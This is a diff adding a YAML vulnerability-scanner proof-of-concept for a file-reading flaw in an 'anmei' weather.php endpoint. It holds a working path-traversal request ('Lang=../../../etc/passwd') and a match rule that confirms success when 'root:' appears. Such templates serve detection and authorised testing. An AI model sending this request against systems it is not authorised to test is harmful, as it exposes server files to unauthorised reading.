@@ -1,0 +1,20 @@
+name: poc-yaml-anmei-weather.php-File-reading
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /user/weather.php?Lang=../../../etc/passwd
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 200 && response.body.bcontains(b'root:')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486356&idx=1&sn=df2497e1c21db8dbe6699e199d1b726d&chksm=c267bea7f51037b15d388750048b62c21e9421d03b3cfc03d9820c144ba623a1e6f34a64b6c1&token=661111678&lang=zh_CN#rd
+
